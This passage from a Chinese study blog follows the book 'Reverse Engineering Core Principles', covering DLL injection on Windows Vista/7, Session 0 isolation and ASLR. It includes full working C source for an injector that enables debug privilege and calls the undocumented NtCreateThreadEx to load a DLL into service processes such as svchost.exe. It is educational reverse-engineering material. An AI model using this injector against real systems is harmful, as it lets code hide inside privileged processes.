API，操作它的参数，或者强制改变错误条件分支语句，就可以正常创建远程线程，并成功实现DLL文件注入。</p><h1 id="43-5-lnjectDII-new-exe"><a href="#43-5-lnjectDII-new-exe" class="headerlink" title="43.5 lnjectDII_new.exe"></a>43.5 lnjectDII_new.exe</h1><p>从前面的学习中我们知道，在Windows 7中实施DLL注入时直接调用ntdll!ZwCreateThreadEx() API要比调用kernel32!CreateRemoteThread()好得多。下面以此为基础编写一个新的InjectDll_new.exe程序，使之能够在Windows Kernel 6 （Vista、7、8等）中顺利完成DLL注入。</p><h2 id="43-5-1-lnjectDII-new-cpp"><a href="#43-5-1-lnjectDII-new-cpp" class="headerlink" title="43.5.1 lnjectDII_new.cpp"></a>43.5.1 lnjectDII_new.cpp</h2><p>首先看新编写的InjectDll()函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br>BOOL <span class="hljs-title function_">SetPrivilege</span><span class="hljs-params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> <br>&#123;<br>    TOKEN_PRIVILEGES tp;<br>    HANDLE hToken;<br>    LUID luid;<br><br>    <span class="hljs-keyword">if</span>( !OpenProcessToken(GetCurrentProcess(),<br>                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, <br>              &amp;hToken) )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( !LookupPrivilegeValue(<span class="hljs-literal">NULL</span>,             <span class="hljs-comment">// lookup privilege on local system</span><br>                              lpszPrivilege,    <span class="hljs-comment">// privilege to lookup </span><br>                              &amp;luid) )          <span class="hljs-comment">// receives LUID of privilege</span><br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError() ); <br>        <span class="hljs-keyword">return</span> FALSE; <br>    &#125;<br><br>    tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>    tp.Privileges[<span class="hljs-number">0</span>].Luid = luid;<br>    <span class="hljs-keyword">if</span>( bEnablePrivilege )<br>        tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>    <span class="hljs-keyword">else</span><br>        tp.Privileges[<span class="hljs-number">0</span>].Attributes = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Enable the privilege or disable all privileges.</span><br>    <span class="hljs-keyword">if</span>( !AdjustTokenPrivileges(hToken, <br>                               FALSE, <br>                               &amp;tp, <br>                               <span class="hljs-keyword">sizeof</span>(TOKEN_PRIVILEGES), <br>                               (PTOKEN_PRIVILEGES) <span class="hljs-literal">NULL</span>, <br>                               (PDWORD) <span class="hljs-literal">NULL</span>) )<br>    &#123; <br>        _tprintf(<span class="hljs-string">L&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError() ); <br>        <span class="hljs-keyword">return</span> FALSE; <br>    &#125; <br><br>    <span class="hljs-keyword">if</span>( GetLastError() == ERROR_NOT_ALL_ASSIGNED )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;The token does not have the specified privilege. \n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125; <br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">DWORD</span> <span class="hljs-params">(WINAPI *PFNTCREATETHREADEX)</span><br><span class="hljs-params">( </span><br><span class="hljs-params">    PHANDLE                 ThreadHandle,</span><br><span class="hljs-params">    ACCESS_MASK             DesiredAccess,</span><br><span class="hljs-params">    LPVOID                  ObjectAttributes,</span><br><span class="hljs-params">    HANDLE                  ProcessHandle,</span><br><span class="hljs-params">    LPTHREAD_START_ROUTINE  lpStartAddress,</span><br><span class="hljs-params">    LPVOID                  lpParameter,</span><br><span class="hljs-params">    BOOL                CreateSuspended,</span><br><span class="hljs-params">    DWORD                   dwStackSize,</span><br><span class="hljs-params">    DWORD                   dw1, </span><br><span class="hljs-params">    DWORD                   dw2, </span><br><span class="hljs-params">    LPVOID                  Unknown </span><br><span class="hljs-params">)</span>; <br><br>BOOL <span class="hljs-title function_">IsVistaOrLater</span><span class="hljs-params">()</span><br>&#123;<br>    OSVERSIONINFO osvi;<br><br>    ZeroMemory(&amp;osvi, <span class="hljs-keyword">sizeof</span>(OSVERSIONINFO));<br>    osvi.dwOSVersionInfoSize = <span class="hljs-keyword">sizeof</span>(OSVERSIONINFO);<br><br>    GetVersionEx(&amp;osvi);<br><br>    <span class="hljs-keyword">if</span>( osvi.dwMajorVersion &gt;= <span class="hljs-number">6</span> )<br>        <span class="hljs-keyword">return</span> TRUE;<br><br>    <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>BOOL <span class="hljs-title function_">MyCreateRemoteThread</span><span class="hljs-params">(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuf)</span><br>&#123;<br>    HANDLE      hThread = <span class="hljs-literal">NULL</span>;<br>    FARPROC     pFunc = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span>( IsVistaOrLater() )    <span class="hljs-comment">// Vista, 7, Server2008</span><br>    &#123;<br>        pFunc = GetProcAddress(GetModuleHandle(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtCreateThreadEx&quot;</span>);<br>        <span class="hljs-keyword">if</span>( pFunc == <span class="hljs-literal">NULL</span> )<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MyCreateRemoteThread() : GetProcAddress(\&quot;NtCreateThreadEx\&quot;) failed!!! [%d]\n&quot;</span>,<br>                   GetLastError());<br>            <span class="hljs-keyword">return</span> FALSE;<br>        &#125;<br><br>        ((PFNTCREATETHREADEX)pFunc)(&amp;hThread,<br>                                    <span class="hljs-number">0x1FFFFF</span>,<br>                                    <span class="hljs-literal">NULL</span>,<br>                                    hProcess,<br>                                    pThreadProc,<br>                                    pRemoteBuf,<br>                                    FALSE,<br>                                    <span class="hljs-literal">NULL</span>,<br>                                    <span class="hljs-literal">NULL</span>,<br>                                    <span class="hljs-literal">NULL</span>,<br>                                    <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span>( hThread == <span class="hljs-literal">NULL</span> )<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MyCreateRemoteThread() : NtCreateThreadEx() failed!!! [%d]\n&quot;</span>, GetLastError());<br>            <span class="hljs-keyword">return</span> FALSE;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>                    <span class="hljs-comment">// 2000, XP, Server2003</span><br>    &#123;<br>        hThread = CreateRemoteThread(hProcess, <br>                                     <span class="hljs-literal">NULL</span>, <br>                                     <span class="hljs-number">0</span>, <br>                                     pThreadProc, <br>                                     pRemoteBuf, <br>                                     <span class="hljs-number">0</span>, <br>                                     <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span>( hThread == <span class="hljs-literal">NULL</span> )<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MyCreateRemoteThread() : CreateRemoteThread() failed!!! [%d]\n&quot;</span>, GetLastError());<br>            <span class="hljs-keyword">return</span> FALSE;<br>        &#125;<br>    &#125;<br><br><span class="hljs-keyword">if</span>( WAIT_FAILED == WaitForSingleObject(hThread, INFINITE) )<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MyCreateRemoteThread() : WaitForSingleObject() failed!!! [%d]\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br>BOOL <span class="hljs-title function_">InjectDll</span><span class="hljs-params">(DWORD dwPID, <span class="hljs-type">char</span> *szDllName)</span><br>&#123;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>    LPVOID pRemoteBuf = <span class="hljs-literal">NULL</span>;<br>    FARPROC pThreadProc = <span class="hljs-literal">NULL</span>;<br>    DWORD dwBufSize = <span class="hljs-built_in">strlen</span>(szDllName)+<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[ERROR] OpenProcess(%d) failed!!! [%d]\n&quot;</span>, <br>        dwPID, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    pRemoteBuf = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, dwBufSize, <br>                                MEM_COMMIT, PAGE_READWRITE);<br><br>    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName, <br>                       dwBufSize, <span class="hljs-literal">NULL</span>);<br><br>    pThreadProc = GetProcAddress(GetModuleHandle(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), <br>                                 <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>( !MyCreateRemoteThread(hProcess, (LPTHREAD_START_ROUTINE)pThreadProc, pRemoteBuf) )<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[ERROR] MyCreateRemoteThread() failed!!!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    VirtualFreeEx(hProcess, pRemoteBuf, <span class="hljs-number">0</span>, MEM_RELEASE);<br><br>    CloseHandle(hProcess);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br><span class="hljs-comment">// adjust privilege</span><br>    SetPrivilege(SE_DEBUG_NAME, TRUE);<br><br>    <span class="hljs-comment">// InjectDll.exe &lt;PID&gt; &lt;dll_path&gt;</span><br>    <span class="hljs-keyword">if</span>( argc != <span class="hljs-number">3</span> )<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage : %s &lt;PID&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( !InjectDll((DWORD)atoi(argv[<span class="hljs-number">1</span>]), argv[<span class="hljs-number">2</span>]) )<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;InjectDll() failed!!!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;InjectDll() succeeded!!!\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>InjectDll()函数中变动的部分是，函数内部并未直接调用kernel32!CreateRemoteThread()，而是调用了名为MyCreateRemoteThread()的用户函数。在MyCreateRemoteThread()函数内部先获取OS的版本，若为Vista以上版本，则调用ntdll!NtCreateThreadEx()函数；若为XP以下版本，则调用kernel32!CreateRemoteThread()。整个代码比较简单，很容易理解。</p><blockquote><p>用户模式下，ntdll.dll 库中的 NtCreateThreadEx()与 ZwCreateThreadEx() API 其实是同一函数（二者起始地址是一样的）。而内核模式（ntoskml.exe）中，二者是不同的。请记住，用户模式下NtXXX()与ZwXXX()是一样的。</p></blockquote><h2 id="43-5-2注入练习"><a href="#43-5-2注入练习" class="headerlink" title="43.5.2注入练习"></a>43.5.2注入练习</h2><p>首先选择一个合适的服务进程（会话0）进行DLL文件注入练习，如图43-21所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220319160030028.png#alt=image-20220319160030028"></p><p>然后运行InjectDll_new.exe命令，输入相关参数进行注入操作，如图43-22所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220319155957904.png#alt=image-20220319155957904"></p><p>最后使用Process Explorer工具查看svchost.exe （PID： 2096），可以看到dummy.dll文件成功注入，如图43-23所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220319160100661.png#alt=image-20220319160100661"></p><p>这样就可以在Windows Kernel 6 （Vista、7、8等）中向服务进程（会话0）顺利注入指定DLL文件。</p><blockquote><p>ntdll!NtCreateThreadEx() API是一个尚未公开的API，所以微软不建议直接调用它，否则将导致系统稳定性失去保障。就我的测试结果来看，调用它之后工作非常正常，但微软可能在以后某个时候修改它。在某个项目中使用该方法时，一定要注意这一点。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第42章 内核6中的会话</title>
    <link href="/1999/04/02/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC42%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84%E4%BC%9A%E8%AF%9D/"/>
    <url>/1999/04/02/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC42%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84%E4%BC%9A%E8%AF%9D/</url>
    
    <content type="html"><![CDATA[<p>第42章内核6中的会话</p><p>Windows OS Kernel 6（Vista、7、8等）开始采用一种新的“会话”（Session）管理机制，本</p><p>章将学习这方面的内容。</p><p>如果你是一个Windows应用程序开发者，那么有可能遇到过以下问题：一个在XP中运行良好的服务程序在Vista或7中无法正常运行^这些服务程序主要是与用户存在交互行为的程序。也就是说，一个以服务形式运行的应用程序中，显示用户对话框或尝试在用户程序与服务程序之间通信时，无法像在XP中一样正常运行。这些问题实际上都是由Kernel6中使用的会话管理机制引起的。从程序的开发角度看，了解Kernel6中这种会话管理机制的改变是十分必要的；从代码逆向分析角度看，会话机制的改变是也个相当重要的事件。因为这意味着原先使用的通过CreateRemoteThread()API进行DLL注入的方法不再适用于Kernel 6中的服务进程（对一般进程仍然适用）。</p><h1 id="42-1会话"><a href="#42-1会话" class="headerlink" title="42.1会话"></a>42.1会话</h1><p>简单地说，会话指的是登录后的用户环境。大部分OS允许多个用户同时登录，并为每个登录的用户提供独立的用户环境。以Windows操作系统为例，“切换用户”可以创建本地用户会话， “远程桌面连接”可以创建远程用户会话。在Process Explorer的View菜单中选择“ Select-Columns-Session”后，即可显示当前运行进程所属的会话（参考图42-1）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC42%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84%E4%BC%9A%E8%AF%9D.assets/image-20220315230851364.png#alt=image-20220315230851364"></p><p>为了查看当前会话，使用“切换用户”功能同时登录2个用户。会话的ID（0、1、2、…）是根据登录顺序确定的。图42-2显示岀Windows 7中正在运行的进程及其所属会话。接下来查看Windows XP中正在运行的进程及其所属会话。</p><blockquote><p>用户登录系统后，系统默认为相应会话创建csrss.exe、winlogon.exe、explorer.exe进程。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC42%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84%E4%BC%9A%E8%AF%9D.assets/image-20220315231631048.png#alt=image-20220315231631048"></p><p>Windows 7（图42-2）与Windows XP（图42-3）有1个非常大的不同。两个操作系统中都登录了2个用户，但Windows 7中共有3个会话（0、1、2），而Windows XP中只有2个会话（0、1）。无 论Windows XP还是Windows 7,系统进程与服务进程都在ID为0的会话（系统会话）中运行。二 者差别在于，第一个登录的用户的会话ID是不同的。Windows XP中，第一个登录系统的用户的会话ID为0;而Windows 7中，第一个登录系统的用户的会话ID为1，非系统会话。这种细微的差别使在XP系统中可以使用的技术在Windows 7中无法正常使用。请注意，上述测试中我计算机的UAC（用户账户控制）处于关闭状态，如图42-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC42%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84%E4%BC%9A%E8%AF%9D.assets/image-20220315231433034.png#alt=image-20220315231433034"></p><h1 id="42-2会话隔离机制"><a href="#42-2会话隔离机制" class="headerlink" title="42.2会话隔离机制"></a>42.2会话隔离机制</h1><p>从Windows内核版本6开始，为进一步增强系统安全性，第一个登录系统的用户会话ID被设为1，使之与系统会话（ID: 0）区分。分离系统会话与用户会话就取消了它们之间的相互作用，采用这种机制虽然可能引起向下兼容的问题，但能够大大增强系统安全性。微软把这种机制称为会话0隔离机制（Session 0 Isolation）。</p><p>关于会话0隔离机制在Windows Team Blog中有非常详细的说明，感兴趣的读者可以进入下面地址学习。</p><p><a href="http://windowsteamblog.com/blogs/developers/archive/2009/10/01/session-0-isolation.aspx">http://windowsteamblog.com/blogs/developers/archive/2009/10/01/session-0-isolation.aspx</a></p><p><a href="https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361">https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361</a></p><h1 id="42-3-增强安全性"><a href="#42-3-增强安全性" class="headerlink" title="42.3 增强安全性"></a>42.3 增强安全性</h1><p>前面介绍的会话0隔离机制以及上一章中讲解的ASLR技术都是为增强系统安全性而增加的功能。虽然用心良苦，但它们能否有效增强系统安全性仍有待商榷。由于会话0中的进程并未完全实现分离，所以会话1中的进程（如：Process Explorer）可以强行终止会话0中的进程，并且ReadProcessMemory()、WriteProcessMemory()、VirtualAllocEx()等调试API也能正常运行（可以轻松绕开ASLR技术）。无论如何，借助微软的这些新增技术，目前尚能拦截过去常见的一些黑客攻击行为。然而随着逆向技术的不断发展，相信会有更高级、更新的针对它们的攻击技术出现。这是一场无休止的“矛”与“盾”的战争。</p><blockquote><p>这场无休止的“矛”与“盾”的战争中，“盾”方（微软）始终处于不利地位，因为他们要考虑到方方面面，既要提供良好的支持，保证各种应用程序正常运行；又要考虑向下兼容性，为用户提供便利。此外还要考虑对大量硬件提供支持，保证系统能够在大量PC上正常运行。由于系统的用户数量非常多，“矛”方（黑客）只要从中选取微软Windows的部分用户（如：MS XP SP3 IE 8用户）进行攻击就能获得好的攻击效果。以战争来比喻，攻击方只要选取一个地方集中力量攻击就能获得较为有利的局面，防守方却会因战线太长、需要守卫的地方过多而筋疲力竭、力不从心。</p></blockquote><p>为了应对这种会话管理机制的变化，我们将在下一章学习新的DLL注入方法，借助新方法可以很好地克服会话管理机制变化对DLL注入造成的不利影响。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第41章 ASLR</title>
    <link href="/1999/04/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC41%E7%AB%A0%20ASLR/"/>
    <url>/1999/04/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC41%E7%AB%A0%20ASLR/</url>
    
    <content type="html"><![CDATA[<p>第41章 ASLR</p><p>ASLR （Address Space Layout Randomization,地址空间布局随机化）是一种针对缓冲区溢岀的安全保护技术，微软从Windows Vista开始采用该技术，本章将学习其相关知识。</p><h1 id="41-1-Windows内核版本"><a href="#41-1-Windows内核版本" class="headerlink" title="41.1 Windows内核版本"></a>41.1 Windows内核版本</h1><p>表41 -1中列出了各Windows OS采用的内核版本。</p><table><thead><tr><th>OS</th><th>内核版本</th></tr></thead><tbody><tr><td>Windows 2000</td><td>5.0</td></tr><tr><td>Windows XP</td><td>5.1</td></tr><tr><td>Windows Server 2003</td><td>5.2</td></tr><tr><td>Windows Vista</td><td>6.0</td></tr><tr><td>Windows Server 2008</td><td>6.0</td></tr><tr><td>Windows Server 2008 R2</td><td>6.1</td></tr><tr><td>Windows 7</td><td>6.1</td></tr></tbody></table><p>微软从Windows Vista开始升级采用新的Major Kernel Version 6 （Major版本号从5升级为6约用了7年）。微软从Windows Vista （Kernel Version 6）开始采用ASLR技术，以进一步加强系统安全性。</p><h1 id="41-2-ASLR"><a href="#41-2-ASLR" class="headerlink" title="41.2 ASLR"></a>41.2 ASLR</h1><p>借助ASLR技术，PE文件每次加载到内存的起始地址都会随机变化，并且每次运行程序时相应进程的栈以及堆的起始地址也会随机改变。也就是说，每次EXE文件运行时加载到进程内存的实际地址都不同，最初加载DLL文件时装载到内存中的实际地址也是不同的。</p><p>微软改用这种方式加载PE文件的原因何在呢？是为了增加系统安全性。大部分Windows OS安全漏洞（一般为缓冲区溢岀）只岀现在特定OS、特定模块、特定版本中。以这些漏洞为目标的漏洞利用代码（exploit code）中，特定内存地址以硬编码形式编人（因为在以前的OS中，根据OS版本的不同，特定DLL总是会加载到固定地址）。因此，微软采用了这种ASLR技术，增加了恶意用户编写漏洞利用代码的难度，从而降低了利用OS安全漏洞破坏系统的风险（UNIX&#x2F;Linux OS等都已采用了ASLR技术）。</p><h1 id="41-3-Visual-C"><a href="#41-3-Visual-C" class="headerlink" title="41.3 Visual C++"></a>41.3 Visual C++</h1><p>请注意，并不是所有可执行文件都自动应用ASLR技术。如上所述，OS的内核版本必须为6以上，并且使用的编程工具（如：VC++）要支持&#x2F;DYNAMICBASE选项。</p><p>一般使用MS Visual C++ 2010创建可执行文件（PE）时，EXE文件的ImageBase默认为00400000，DLL文件的ImageBase为10000000。但编译它们时，如果默认开启了 VC++的&#x2F;DYNAMICBASE选项，那么ASLR技术就会如图41-1所示应用到编译的文件中。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC41%E7%AB%A0%20ASLR.assets/image-20220315195216246.png#alt=image-20220315195216246"></p><p>若不想应用ASLR技术，只需将“随机基址”选项改为“&#x2F;DYNAMICBASE:NO” 即可，如图41-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC41%E7%AB%A0%20ASLR.assets/image-20220315195237209.png#alt=image-20220315195237209"></p><h1 id="41-4-ASLR-exe"><a href="#41-4-ASLR-exe" class="headerlink" title="41.4 ASLR.exe"></a>41.4 ASLR.exe</h1><blockquote><p>本示例程序使用的所有源代码由MS Visual C++2010 Express Edition开发而成，在Windows 7 32位环境中通过测试。</p></blockquote><p>为了测试ASLR技术，我们首先编写一个简单的基于控制台的程序，程序源代码如下所示。</p><p>然后打开VC++的&#x2F;DYNAMICBASE选项，编译得到ASLR.exe程序；再关闭&#x2F;DYNAMICBASE:NO选项，编译得到ASLR_no.exe程序。接下来使用调试器分别调试。</p><p>图41-3是使用OllyDbg调试ASLR.exe的画面，请认真查看EP代码地址与栈地址（如果使用的操作系统是VISTA以上版本的，那么每次运行时地址都会随机变化）。</p><p>图41-4是使用OllyDbg调试ASLR_no.exe的画面，EP代码地址与栈地址未变化，就像在XP系统中看到的一样。下面使用PEView工具查看并比较它们。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ASLR test program...\n&quot;</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC41%E7%AB%A0%20ASLR.assets/image-20220315200418062.png#alt=image-20220315200418062"></p><p><img 